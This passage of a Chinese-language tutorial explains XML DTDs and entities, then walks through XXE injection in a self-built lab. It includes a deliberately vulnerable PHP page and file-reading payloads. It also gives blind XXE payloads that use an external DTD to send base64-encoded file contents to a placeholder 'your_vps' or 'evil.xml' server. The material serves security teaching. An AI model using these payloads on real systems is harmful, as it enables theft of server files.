class="headerlink" title="0x001 简介"></a>0x001 简介</h4><blockquote><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。它使用一系列的合法元素来定义文档结构。<br>通过 DTD，您的每一个 XML 文件均可携带一个有关其自身格式的描述。<br>通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。</p><p>使用 DTD 来验证您自身的数据。</p><p>DTD（Document Type Definition文档类型定义）是一组机器可读的规则，它们定义XML或HTML的特定版本中允许有什么，不允许有什么。在解析网页时，浏览器将使用这些规则检查页面的有效性并且采取相应的措施。（由DTD中定义的文档类型影响）<br>DTD是对HTML文档声明，还会影响浏览器的渲染模式（工作模式）。（由页面中书写DTD的方式影响）</p></blockquote><p>简言之，DTD用来告诉浏览器你用的是什么标记语言</p><h6 id="内部的-DOCTYPE-声明"><a href="#内部的-DOCTYPE-声明" class="headerlink" title="内部的 DOCTYPE 声明"></a><strong>内部的 DOCTYPE 声明</strong></h6><p>DTD被包含在XML源中的表现声明形式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure><h6 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a><strong>实例</strong></h6><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">to</span>      (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">from</span>    (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">heading</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">body</span>    (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>以上 DTD 解释如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">!DOCTYPE note (第二行)定义此文档是 note 类型的文档。</span><br><span class="line"></span><br><span class="line">!ELEMENT note (第三行)定义 note 元素有四个元素：&quot;to、from、heading、body&quot;</span><br><span class="line"></span><br><span class="line">!ELEMENT to (第四行)定义 to 元素为 &quot;#PCDATA&quot; 类型</span><br><span class="line"></span><br><span class="line">!ELEMENT from (第五行)定义 from 元素为 &quot;#PCDATA&quot; 类型</span><br><span class="line"></span><br><span class="line">!ELEMENT heading (第六行)定义 heading 元素为 &quot;#PCDATA&quot; 类型</span><br><span class="line"></span><br><span class="line">!ELEMENT body (第七行)定义 body 元素为 &quot;#PCDATA&quot; 类型</span><br></pre></td></tr></table></figure><h6 id="外部文档声明"><a href="#外部文档声明" class="headerlink" title="外部文档声明"></a><strong>外部文档声明</strong></h6><p>DTD被包含在XML源头部的表现定义形式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure><h6 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a><strong>实例</strong></h6><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;note.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span> </span><br></pre></td></tr></table></figure><p>包含 DTD 的 “note.dtd” 文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">to</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">from</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">heading</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">body</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br></pre></td></tr></table></figure><h4 id="0x002-构建模块"><a href="#0x002-构建模块" class="headerlink" title="0x002 构建模块"></a>0x002 构建模块</h4><p>所有的 XML 文档（以及 HTML 文档）均由以下简单的构建模块构成：</p><ul><li>元素</li><li>属性</li><li>实体</li><li>PCDATA</li><li>CDATA</li></ul><h4 id="0x003元素"><a href="#0x003元素" class="headerlink" title="0x003元素"></a>0x003元素</h4><p>元素是 XML 以及 HTML 文档的<em>主要构建模块</em>。</p><p>HTML 元素的例子是 “body” 和 “table”。XML 元素的例子是 “note” 和 “message” 。元素可包含文本、其他元素或者是空的。空的 HTML 元素的例子是 “hr”、”br” 以及 “img”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT 元素名称 类别&gt;</span><br><span class="line">或</span><br><span class="line">&lt;!ELEMENT 元素名称 (元素内容)&gt;</span><br></pre></td></tr></table></figure><h4 id="0x004属性"><a href="#0x004属性" class="headerlink" title="0x004属性"></a>0x004属性</h4><p>属性可提供<em>有关元素的额外信息</em>。</p><p>属性总是被置于某元素的开始标签中。属性总是以<em>名称&#x2F;值</em>的形式成对出现的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;&quot; /&gt; 分别为&lt;元素 属性=&quot;属性的值&quot; /&gt;</span><br></pre></td></tr></table></figure><p>属性声明使用下列语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST 元素名称 属性名称 属性类型 默认值&gt;</span><br></pre></td></tr></table></figure><h4 id="0X005-DTD实体"><a href="#0X005-DTD实体" class="headerlink" title="0X005 DTD实体"></a>0X005 DTD实体</h4><ul><li><p>实体是用来定义普通文本的变量。</p></li><li><p>实体引用是对实体的引用。</p></li><li><p>大多数同学都了解这个 HTML 实体引用：”&nbsp;”。这个“无折行空格”实体在 HTML 中被用于在某个文档中插入一个额外的空格。</p></li><li><p>当文档被 XML 解析器解析时，实体就会被展开。</p></li><li><p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量</p></li><li><p>可以内部声明或外部引用。</p></li><li><p>实体又分为一般实体和参数实体</p><p>1.一般实体的声明语法:</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名 &quot;实体内容“&gt;</span><br></pre></td></tr></table></figure><p>引用实体的方式：&amp;实体名；<br>2.参数实体只能在DTD中使用，参数实体的声明格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名 &quot;实体内容“&gt;</span><br></pre></td></tr></table></figure><p>引用实体的方式：%实体名；<br><strong>一般实体指代的是将来XML数据文档要用到的文本或数据，而参数实体是在DTD文档内定义的一种DTD信息，所代表的是DTD定义的一部分，不能在XML文档中使用，也不能在DTD中定义。</strong></p><h6 id="内部一般实体声明"><a href="#内部一般实体声明" class="headerlink" title="内部一般实体声明"></a>内部一般实体声明</h6><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY entity-name &quot;entity-value&quot;&gt; </span><br></pre></td></tr></table></figure><p>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE author[</span><br><span class="line">    &lt;!ENTITY writer &quot;Donald Duck.&quot;&gt;</span><br><span class="line">    &lt;!ENTITY copyright &quot;Copyright runoob.com&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt; </span><br></pre></td></tr></table></figure><h6 id="外部一般实体声明"><a href="#外部一般实体声明" class="headerlink" title="外部一般实体声明"></a>外部一般实体声明</h6><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY entity-name SYSTEM &quot;URI/URL&quot;&gt; </span><br></pre></td></tr></table></figure><p>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE author[</span><br><span class="line">    &lt;!ENTITY writer SYSTEM &quot;http://www.runoob.com/entities.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY copyright SYSTEM &quot;http://www.runoob.com/entities.dtd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt; </span><br></pre></td></tr></table></figure><h6 id="内部参数实体"><a href="#内部参数实体" class="headerlink" title="内部参数实体"></a>内部参数实体</h6><p>参数实体不能被应用在元素的声明当中，不能使用参数实体来定义元素，只有在外部DTD中参数实体才能被应用到元素的声明当中。<br><code>test1.xml</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;  </span><br><span class="line">&lt;!DOCTYPE person SYSTEM &quot;test1.dtd&quot;&gt;  </span><br><span class="line">&lt;person&gt;  </span><br><span class="line">    &lt;name&gt;Jason&lt;/name&gt;  </span><br><span class="line">    &lt;addr&gt;Shanghai&lt;/addr&gt;  </span><br><span class="line">    &lt;tel&gt;18701772821&lt;/tel&gt;  </span><br><span class="line">    &lt;br/&gt;  </span><br><span class="line">    &lt;email&gt;18701772821@163.com&lt;/email&gt;  </span><br><span class="line">&lt;/person&gt;  </span><br></pre></td></tr></table></figure><p><code>test1.dtd</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;  </span><br><span class="line">&lt;!ELEMENT person (name,addr,tel,br,email)&gt;  </span><br><span class="line">&lt;!ENTITY %name &quot;(#PCDATA)&quot;&gt;  </span><br><span class="line">&lt;!ELEMENT addr %name;&gt;  </span><br><span class="line">&lt;!ELEMENT tel %name;&gt;  </span><br><span class="line">&lt;!ELEMENT br EMPTY&gt;  </span><br><span class="line">&lt;!ELEMENT email %name;&gt;  </span><br></pre></td></tr></table></figure><p>参数实体必须先定义再使用，而不能像一般实体那样随意放置。</p><h6 id="外部参数实体"><a href="#外部参数实体" class="headerlink" title="外部参数实体"></a>外部参数实体</h6><p>能将原来很长的DTD文档转变成一个很小的、相互调用的文档集合，适合大型DTD文档的设计开发。<br><code>test1.xml</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;  </span><br><span class="line">&lt;!DOCTYPE person [  </span><br><span class="line">&lt;!ELEMENT person (name,addr,tel,br,email)&gt;  </span><br><span class="line">&lt;!ENTITY % （注意这里有个空格）content SYSTEM &quot;test1.dtd&quot;&gt;  </span><br><span class="line">%content;  </span><br><span class="line">]&gt;  </span><br><span class="line">&lt;person&gt;  </span><br><span class="line">    &lt;name&gt;Jason&lt;/name&gt;  </span><br><span class="line">    &lt;addr&gt;Shanghai&lt;/addr&gt;  </span><br><span class="line">    &lt;tel&gt;18701772821&lt;/tel&gt;  </span><br><span class="line">    &lt;br/&gt;  </span><br><span class="line">    &lt;email&gt;18701772821@163.com&lt;/email&gt;  </span><br><span class="line">&lt;/person&gt;  </span><br></pre></td></tr></table></figure><p><code>test1.dtd</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;  </span><br><span class="line">&lt;!ELEMENT name (#PCDATA)&gt;  </span><br><span class="line">&lt;!ELEMENT addr (#PCDATA)&gt;  </span><br><span class="line">&lt;!ELEMENT tel (#PCDATA)&gt;  </span><br><span class="line">&lt;!ELEMENT br EMPTY&gt;  </span><br><span class="line">&lt;!ELEMENT email (#PCDATA)&gt;  </span><br></pre></td></tr></table></figure><h4 id="0x006-PCDATA"><a href="#0x006-PCDATA" class="headerlink" title="0x006 PCDATA"></a>0x006 PCDATA</h4><ul><li>PCDATA 的意思是被解析的字符数据（parsed character data）。</li><li>可把字符数据想象为 XML 元素的开始标签与结束标签之间的文本。</li><li>PCDATA 是会被解析器解析的文本。</li><li>这些文本将被解析器检查实体以及标记。</li><li>文本中的标签会被当作标记来处理，而实体会被展开。</li><li>被解析的字符数据不应当包含任何 &amp;、&lt; 或者 &gt; 字符；</li><li>需要使用 &amp;、&lt; 以及 &gt; 实体来分别替换它们。</li></ul><h4 id="0x007-CDATA"><a href="#0x007-CDATA" class="headerlink" title="0x007 CDATA"></a>0x007 CDATA</h4><ul><li>CDATA 的意思是字符数据（character data）。</li><li>CDATA 是不会被解析器解析的文本。</li><li>在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。</li></ul><h2 id="0x04-XML实体注入实例"><a href="#0x04-XML实体注入实例" class="headerlink" title="0x04 XML实体注入实例"></a>0x04 XML实体注入实例</h2><blockquote><p>找一台服务器，一台本地主机，服务器作为靶机测试</p></blockquote><h4 id="0x001-有回显测试"><a href="#0x001-有回显测试" class="headerlink" title="0x001 有回显测试"></a>0x001 有回显测试</h4><p>在靶机新建test.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xml</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;xml&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span> = @<span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$xml</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="comment">//simplexml_load_string() 函数转换形式良好的 XML 字符串为 SimpleXMLElement 对象。</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>123.txt</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test succeed</span><br></pre></td></tr></table></figure><h6 id="外部实体读取文件"><a href="#外部实体读取文件" class="headerlink" title="外部实体读取文件"></a>外部实体读取文件</h6><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">靶机ip?xml=&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;file://123.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;note&gt;&amp;file;&lt;/note&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p>读取靶机123.txt回显：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SimpleXMLElement Object ( [file] =&gt; SimpleXMLElement Object ( [file] =&gt; test succeed )</span><br></pre></td></tr></table></figure><h6 id="引用DTD文件"><a href="#引用DTD文件" class="headerlink" title="引用DTD文件"></a>引用DTD文件</h6><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">靶机ip?xml=&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line"> &lt;!DOCTYPE note [&lt;!ENTITY % a SYSTEM &quot;http://192.168.86.128/dtdfile.dtd&quot;&gt; %a;]&gt;</span><br><span class="line"> &lt;note&gt;&amp;file;&lt;/note&gt;</span><br></pre></td></tr></table></figure><p>在本机新建dtd文件(dtdfile.dtd):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY file SYSTEM &quot;file://123.txt&quot;&gt;</span><br></pre></td></tr></table></figure><p>读取靶机123.txt回显：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SimpleXMLElement Object ( [file] =&gt; SimpleXMLElement Object ( [file] =&gt; test succeed )</span><br></pre></td></tr></table></figure><h4 id="0x002-无回显测试"><a href="#0x002-无回显测试" class="headerlink" title="0x002 无回显测试"></a>0x002 无回显测试</h4><p>可以将结果打到服务器上，查看日志，或则将结果保存为文件</p><h6 id="引用远程服务器上的XML文件读取文件"><a href="#引用远程服务器上的XML文件读取文件" class="headerlink" title="引用远程服务器上的XML文件读取文件"></a>引用远程服务器上的XML文件读取文件</h6><p>payload:</p><p>xxe.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://your_vps/test.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>test.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">all</span> <span class="string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://your_vps/get.php?file=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意:<strong>参数实体引用不能出现在内部DTD的标记声明内部</strong></p><blockquote><p>在内部DTD中引入参数实体不能写在标记声明内部，但可写在DTD中标记出现的地方，也就是标记外。</p><p>如果想在DTD标记声明中引入参数实体，那么就必须用外部DTD。</p></blockquote><p><strong>使用的<a href="https://link.jianshu.com/?t=php://filter">php:&#x2F;&#x2F;filter</a>将文件内容进行了base64编码，因为当我们读取的文件是php或则html文件时，文件的代码包含<code>&lt;</code> <code>&gt;</code>符号时会导致解析错误</strong><br><strong>这里声明payload实体参数，该实体参数以base64编码方式读取了靶机中123.txt文件内容，然后做为URL参数请求到自己的服务器上。</strong></p><h2 id="0x05-XXE"><a href="#0x05-XXE" class="headerlink" title="0x05 XXE"></a>0x05 XXE</h2><h4 id="0x001-Blind-XXE原理"><a href="#0x001-Blind-XXE原理" class="headerlink" title="0x001 Blind XXE原理"></a>0x001 Blind XXE原理</h4><p>带外数据通道的建立是使用嵌套形式，利用外部实体中的URL发出访问，从而跟攻击者的服务器发生联系。</p><h4 id="0x002-误区"><a href="#0x002-误区" class="headerlink" title="0x002 误区"></a>0x002 误区</h4><p>直接在内部实体定义中引用另一个实体的方法如下，但是这种方法行不通。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">param1</span> <span class="string">&quot;file:///c:/1.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">param2</span> <span class="string">&quot;http://127.0.0.1/?%param1&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%param2;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>内部实体嵌套的形式：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">param1</span> <span class="string">&quot;file:///c:/1.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">param2</span> <span class="string">&quot;&lt;!ENTITY % param222 SYSTEM&#x27;http://127.0.0.1/?%param1;&#x27;&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%param2;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">[This is my site]</span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>但是这样做行不通，原因是不能在实体定义中引用参数实体，即有些解释器不允许在内层实体中使用外部连接，无论内层是一般实体还是参数实体。</strong></p><h4 id="0x003-误区解决方案"><a href="#0x003-误区解决方案" class="headerlink" title="0x003 误区解决方案"></a>0x003 误区解决方案</h4><p>将嵌套的实体声明放入到一个外部文件中，这里一般是放在攻击者的服务器上，这样做可以规避错误。</p><p>如下：</p><p>source file</p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:/1.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://192.168.150.1/evil.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>evil.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">all</span> <span class="string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://192.168.150.1/1.php?file=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>实体remote，all，send的引用顺序很重要:</p><ul><li>首先对remote引用目的是将外部文件evil.xml引入到解释上下文中，</li><li>然后执行%all，</li><li>这时会检测到send实体，</li><li>在root节点中引用send，</li><li>就可以成功实现数据转发。</li></ul><p>当然，也直接在DTD中引用send实体，<strong>如果在evil.xml中，send是个参数实体的话</strong>，即以下方式：</p><p>source file</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:/1.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span 